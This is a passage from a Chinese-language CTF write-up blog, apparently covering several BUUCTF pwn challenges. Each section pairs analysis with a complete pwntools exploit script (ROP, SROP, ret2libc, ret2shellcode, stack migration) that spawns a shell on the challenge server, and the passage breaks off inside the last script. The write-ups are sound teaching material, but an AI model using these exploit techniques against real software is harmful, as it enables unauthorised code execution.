<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">mov_rax_59_ret = <span class="number">0x4004e2</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4005a3</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15_ret = <span class="number">0x40059a</span></span><br><span class="line">mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12 = <span class="number">0x400580</span></span><br><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">syscall = <span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span> + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28147</span>)<span class="comment">#process(&#x27;./ciscn_s_3&#x27;)# </span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">8</span>))-<span class="number">0x118</span></span><br><span class="line">sh_addr = stack_addr + <span class="number">8</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(sh_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload2 =  p64(pop_rdi_ret) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(pop_rbx_rbp_r12_r13_r14_r15_ret)</span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(stack_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload2 += p64(mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12)</span><br><span class="line">payload2 += p64(mov_rax_59_ret) + p64(pop_rdi_ret) + p64(sh_addr)</span><br><span class="line">payload2 += p64(syscall)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行脚本即可getshell</p>
<p><img src="https://i.loli.net/2020/11/28/cCwJmaSEt5Kxqeg.png" alt="image.png"></p>
<h3 id="解法2：SROP"><a href="#解法2：SROP" class="headerlink" title="解法2：SROP"></a>解法2：SROP</h3><blockquote>
<p><del>试了好几种姿势都没弄出来，离谱</del></p>
<p><del>难道SROP退出历史舞台了🐎</del></p>
<p>是我傻了，我给弄成str().encode()了，应该用bytes()…</p>
<p><del>早知道自己手撕一个frame可能还好点</del></p>
</blockquote>
<p>前面的解法我们使用了gadget中给出的59号系统调用<code>execve</code>，这个解法则是使用了gadget中给出的另外一个15号系统调用<code>rt_sigreturn</code></p>
<p>系统调用<code>rt_sigreturn</code>用于恢复用户态的寄存器状态，从栈上保存的数据来恢复寄存器的状态</p>
<p>在正常情况下，由用户态切换到内核态之前，系统会将当前进程的寄存器状态压入栈中，将<code>rt_sigreturn</code>作为返回地址一并压入；从内核态切回用户态时便通过栈上的数据来恢复寄存器的状态，大致布局如下：</p>
<p><img src="https://image.3001.net/images/20151128/14487175105930.png!small" alt="image.png"></p>
<p>因此我们只需要伪造一个SigreturnFrame执行execve(“&#x2F;bin&#x2F;sh”,0,0)即可</p>
<p>使用pwntools中的SigreturnFrame工具可以快速构造一个 fake frame</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p =remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26063</span>)<span class="comment"># process(&#x27;./ciscn_s_3&#x27;) # </span></span><br><span class="line">e = ELF(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">mov_rax_15_ret = <span class="number">0x4004da</span></span><br><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span> + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_leak = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x118</span></span><br><span class="line">log.info(<span class="string">&quot;stack addr: &quot;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0x3b</span> <span class="comment"># syscall::execve, constants.SYS_execve is also ok</span></span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line">frame.rdi = stack_leak</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">payload2 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0xdeadbeef</span>) + p64(mov_rax_15_ret) + p64(syscall_addr) + <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即得flag</p>
<p><img src="https://i.loli.net/2020/11/29/CJxnp4FVN6RoujY.png" alt="image.png"></p>
<blockquote>
<p>SROP(Sigreturn Oriented Programming)技术利用了类Unix系统中的Signal机制，如图：</p>
<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20190522125217-5fced1dc-7c4d-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190522125217-5fced1dc-7c4d-1.png" alt="img"></a></p>
<ol>
<li>当一个用户层进程发起signal时，控制权切到内核层</li>
<li>内核保存进程的上下文(对我们来说重要的就是寄存器状态)到用户的栈上，然后再把rt_sigreturn地址压栈，跳到用户层执行Signal Handler，即调用rt_sigreturn</li>
<li>rt_sigreturn执行完，跳到内核层</li>
<li>内核恢复②中保存的进程上下文，控制权交给用户层进程</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5240">先知社区-SROP exploit</a></p>
</blockquote>
<h2 id="0x016-铁人三项-第五赛区-2018-rop-ret2libc"><a href="#0x016-铁人三项-第五赛区-2018-rop-ret2libc" class="headerlink" title="0x016.铁人三项(第五赛区)_2018_rop - ret2libc"></a>0x016.铁人三项(第五赛区)_2018_rop - ret2libc</h2><p>惯例的<code>checksec</code>，只开了NX</p>
<p><img src="https://i.loli.net/2020/10/19/2FfsUenMSKoQ7qY.png" alt="image.png"></p>
<p>拖入IDA分析</p>
<p><img src="https://i.loli.net/2020/10/19/PDEMKizc5g2HIyl.png" alt="image.png"></p>
<p>直接给了一个很大的溢出，但是没有直接getshell的gadget，故考虑构造rop链先泄露read函数真实地址再使用LibcSearcher寻找Libc版本最后构造rop链执行<code>system(&quot;/bin/sh&quot;)</code>以getshell</p>
<p>构造exp如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from LibcSearcher import *</span><br><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;node3.buuoj.cn&#x27;,28409)#process(&#x27;./2018_rop&#x27;)</span><br><span class="line">e = ELF(&#x27;./2018_rop&#x27;)</span><br><span class="line">offset = 0x88</span><br><span class="line">read_got = e.got[&#x27;read&#x27;]</span><br><span class="line">write_plt = e.plt[&#x27;write&#x27;]</span><br><span class="line"></span><br><span class="line">payload1 = offset * b&#x27;A&#x27; + p32(0xdeadbeef) + p32(write_plt) + p32(0x8048474) + p32(1) + p32(read_got) + p32(4)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">read_str = p.recv(4).ljust(4,b&#x27;\x00&#x27;)</span><br><span class="line">print(read_str)</span><br><span class="line">read_addr = u32(read_str)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;read&#x27;,read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(&#x27;read&#x27;)</span><br><span class="line">sys_addr = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">sh_addr = libc_base  + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">payload2 = offset * b&#x27;A&#x27; + p32(0xdeadbeef) + p32(sys_addr) + p32(0xdeadbeef) + p32(sh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/10/19/5HYQqUcMGavCsdS.png" alt="image.png"></p>
<h2 id="0x017-bjdctf-2020-babyrop-ret2csu-ret2libc"><a href="#0x017-bjdctf-2020-babyrop-ret2csu-ret2libc" class="headerlink" title="0x017.bjdctf_2020_babyrop - ret2csu + ret2libc"></a>0x017.bjdctf_2020_babyrop - ret2csu + ret2libc</h2><p>惯例<code>checksec</code>，只开了栈不可执行保护</p>
<p><img src="https://i.loli.net/2020/11/15/zhfrI8Kpij7NWT6.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2020/11/15/cmGeARE3V18x9H2.png" alt="image.png"></p>
<p>可以发现在<code>vuln()</code>函数处存在栈溢出</p>
<p>由于没有后面函数，故考虑ret2libc构造rop链执行<code>system(&quot;/bin/sh&quot;)</code></p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28167</span>) <span class="comment"># p = process(&#x27;./bjdctf_2020_babyrop&#x27;) # </span></span><br><span class="line">e = ELF(<span class="string">&#x27;./bjdctf_2020_babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400733</span></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">offset = <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">payload1 = offset*<span class="string">b&#x27;A&#x27;</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(e.sym[<span class="string">&#x27;vuln&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">puts_str = p.recvuntil(<span class="string">b&#x27;\nPull up&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(puts_str)</span><br><span class="line">puts_addr = u64(puts_str)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = offset*<span class="string">b&#x27;A&#x27;</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行脚本，得到flag</p>
<p><img src="https://i.loli.net/2020/11/15/S46DkWpHcz5qLiF.png" alt="image.png"></p>
<h2 id="0x018-pwn2-sctf-2016-integer-overflow-ret2libc"><a href="#0x018-pwn2-sctf-2016-integer-overflow-ret2libc" class="headerlink" title="0x018.pwn2_sctf_2016 - integer overflow + ret2libc"></a>0x018.pwn2_sctf_2016 - integer overflow + ret2libc</h2><p>惯例<code>checksec</code>，发现只开了NX保护</p>
<p>![0QJ_UK7O_A2KJOURYNP&#96;_KW.png](<a target="_blank" rel="noopener" href="https://i.loli.net/2020/10/09/j5cJeXs3HS4VQr2.png">https://i.loli.net/2020/10/09/j5cJeXs3HS4VQr2.png</a>)</p>
<p>拖入IDA进行分析</p>
<p>在<code>vuln()</code>函数中使用<code>get_n()</code>函数读入4字节并使用<code>atoi()</code>转为数字，若是大于32则退出，否则再一次调用<code>get_n()</code>函数进行读入</p>
<p>![A&#96;GN6_COM3ZZ5BGCO0P1~AK.png](<a target="_blank" rel="noopener" href="https://i.loli.net/2020/10/09/IUtdTGcg2eHshOn.png">https://i.loli.net/2020/10/09/IUtdTGcg2eHshOn.png</a>)</p>
<p>不过我们可以发现在<code>get_n()</code>函数中，其所接收的第二个参数为<code>unsigned int</code>，若是我们读入数字<code>-1</code>则会发生整数溢出变成一个巨大的正数，那么在这里便存在溢出点了</p>
<p><img src="https://i.loli.net/2020/10/09/Iy2iukBamRfXd1x.png" alt="SH@J5_XNE_9R_DEH0R_A_T0.png"></p>
<p>文件本身不存在可以直接getshell的函数（并且附赠了一堆没用的gadget），故考虑<strong>ret2libc</strong>，首先泄漏出printf函数地址，再使用LibcSearcher得到libc，最后构造<code>system(&quot;/bin/sh&quot;)</code>即可</p>
<p>程序中存在<code>%s</code>字符串供打印</p>
<p><img src="https://i.loli.net/2020/10/09/MzHjLZfqXTpBxaF.png" alt="1__H@0HQW54N_D27DI_SM_3.png"></p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn2_sctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x804A040</span></span><br><span class="line">fmtstr_addr = <span class="number">0x8048702</span></span><br><span class="line">printf_got = e.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_plt = e.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main_addr = e.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x2c</span> + p32(<span class="number">0xdeadbeef</span>) + p32(printf_plt) + p32(main_addr) + p32(fmtstr_addr) + p32(printf_got)</span><br><span class="line"></span><br><span class="line">p =remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29032</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;You said&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br><span class="line">libc_base = printf_addr - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x2c</span> + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) +  <span class="number">5</span>*p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可getshell</p>
<p><img src="https://i.loli.net/2020/10/09/3pdunR4j1yBtrOL.png" alt="E@O1G4DY_S2_DR_2J_0E__O.png"></p>
<h2 id="0x019-others-shellcode"><a href="#0x019-others-shellcode" class="headerlink" title="0x019.others_shellcode"></a>0x019.others_shellcode</h2><p>直接连接就有flag了…</p>
<p><img src="https://i.loli.net/2020/11/15/ci6yp5J3jWVagZK.png" alt="image.png"></p>
<h2 id="0x01A-HarekazeCTF2019-baby-rop2-ret2csu-ret2libc"><a href="#0x01A-HarekazeCTF2019-baby-rop2-ret2csu-ret2libc" class="headerlink" title="0x01A.[HarekazeCTF2019]baby_rop2 - ret2csu + ret2libc"></a>0x01A.[HarekazeCTF2019]baby_rop2 - ret2csu + ret2libc</h2><p>惯例的<code>checksec</code>，发现只开了NX</p>
<p><img src="https://i.loli.net/2020/10/09/dhNruafBqwiGHj7.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2020/10/09/BAIuUsgEq8VkCD2.png" alt="image.png"></p>
<p>主函数中存在溢出，不过没有可以利用的函数，故考虑ret2libc：先使用printf泄露read函数地址再用LibcSearcher得到libc最后构造rop链执行<code>system(&quot;/bin/sh&quot;)</code>即可</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./babyrop2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x400731</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400733</span></span><br><span class="line">fmtstr = <span class="number">0x400790</span></span><br><span class="line">read_got = e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">printf_plt = e.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main_addr = e.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rsi_r15_ret) + p64(read_got) +p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(fmtstr) + p64(printf_plt) + p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25106</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">str</span> = p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line">read_addr = u64(<span class="built_in">str</span>)</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>,read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行，得到flag<del>藏的位置好深啊</del></p>
<p><img src="https://i.loli.net/2020/10/09/L43Evc2IVdUWkCF.png" alt="F240_K_XDU@_4RS_JFVI~RP.png"></p>
<h2 id="0x01B-ez-pz-hackover-2016-ret2shellcode"><a href="#0x01B-ez-pz-hackover-2016-ret2shellcode" class="headerlink" title="0x01B.ez_pz_hackover_2016 - ret2shellcode"></a>0x01B.ez_pz_hackover_2016 - ret2shellcode</h2><p>惯例的<code>checksec</code>，保护全关，暗示我们可以为所欲为</p>
<p><img src="https://i.loli.net/2021/01/28/wrpVQtRyPuC26Y7.png"></p>
<p>拖入IDA进行分析</p>
<p>在<code>chall()</code>函数中给我们泄露了一个栈上地址，并读入1023字节，无法溢出</p>
<p><img src="https://i.loli.net/2020/11/30/nxCyhzXdESge4OH.png" alt="image.png"></p>
<p>但是在vuln函数中会拷贝一次我们的输入，<strong>可以溢出</strong></p>
<p><img src="https://i.loli.net/2020/11/30/ldt9YWcke8NvpUT.png" alt="image.png"></p>
<p>由于给了一个栈上地址，故考虑输入一段shellcode后跳转即可</p>
<p>需要注意的一个点是<code>vuln()</code>函数是<strong>将传入的参数的地址作为参数传入memcpy的</strong>，故实际上会额外拷贝0xec - 0xd0 &#x3D; 0x1c字节，那么我们填充到ebp所需的padding长度其实只需要0x32 - 0x1c &#x3D; 0x16字节</p>
<p><img src="https://i.loli.net/2021/01/28/lLxs4uqDPHd3Cp5.png"></p>
<p>泄露出来的地址和我们拷贝到的地址上的shellcode间距为0x9ec - 0x9d0 &#x3D; 0x1c，直接跳转过去即可，需要注意的是<strong>因为memcpy拷贝了长达0x400字节的内容，会将我们第一次输入的数据尽数破坏，故我们只能向拷贝后的地址跳</strong></p>
<p><img src="https://i.loli.net/2020/12/01/tKG7EIMTbcS3wLa.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/11/30/n5M1HGzuTxy7QZb.png" alt="_9T8_GI__708_M0FN1H~_GC.png"></p>
<p>故构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./ez_pz_hackover_2016&quot;</span>) <span class="comment">#  remote(&quot;node3.buuoj.cn&quot;, 25809) # </span></span><br><span class="line">offset = <span class="number">0x16</span></span><br><span class="line">verify = <span class="string">b&quot;crashme\x00&quot;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;lets crash: &quot;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;stack leak: &quot;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line">payload = verify + <span class="string">b&#x27;A&#x27;</span> * (offset - <span class="built_in">len</span>(verify)) + p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(stack_leak - <span class="number">0x1c</span>) + asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行，得到flag</p>
<p><img src="https://i.loli.net/2020/12/01/P9gryD43xBNawEL.png" alt="image.png"></p>
<h2 id="0x01C-ciscn-2019-es-2-ret2text-stack-migration"><a href="#0x01C-ciscn-2019-es-2-ret2text-stack-migration" class="headerlink" title="0x01C.ciscn_2019_es_2 - ret2text + stack migration"></a>0x01C.ciscn_2019_es_2 - ret2text + stack migration</h2><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p>
<p><img src="https://i.loli.net/2020/12/01/uifxqJUW9rIQpS1.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2020/12/01/Mdng1Imo6tPrkyC.png" alt="image.png"></p>
<p>存在溢出，且读取两次输出两次，故第一次我们可以填充0x28字节获得一个栈上地址</p>
<p><img src="https://i.loli.net/2020/12/01/MIteH4sl7aKJORj.png" alt="image.png"></p>
<p>存在system函数</p>
<p>由于溢出只有8个字节，而我们能够获得栈上地址，故考虑进行<strong>栈迁移</strong>，在栈上构造ROP链</p>
<p>题目中只给了<code>system()</code>函数，没给<code>/bin/sh</code>字符串，不过由于栈上地址可知，故我们可以将之读取到栈上</p>
<p>gdb调试可知我们的输入与所泄露地址间距为0xe18 - 0xde0 &#x3D; 0x38</p>
<p><img src="https://i.loli.net/2020/12/01/WXw721cUfC9LDqQ.png" alt="image.png"></p>
<p>故构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>, <span class="number">25040</span>) <span class="comment"># process(&quot;./ciscn_2019_es_2&quot;) #</span></span><br><span class="line">e = ELF(<span class="string">&quot;./ciscn_2019_es_2&quot;</span>)</span><br><span class="line">offset = <span class="number">0x28</span></span><br><span class="line">leave_ret = <span class="number">0x80485FD</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset</span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(payload)</span><br><span class="line">stack_leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="built_in">hex</span>(stack_leak))</span><br><span class="line">payload2 = p32(e.sym[<span class="string">&#x27;system&#x27;</span>]) + p32(<span class="number">0xdeadbeef</span>) + p32(stack_leak-<span class="number">0x38</span> + <span class="number">12</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload2 += <span class="string">b&#x27;A&#x27;</span> * (offset - <span class="built_in">len</span>(payload2)) + p32(stack_leak - <span class="number">0x38</span> - <span 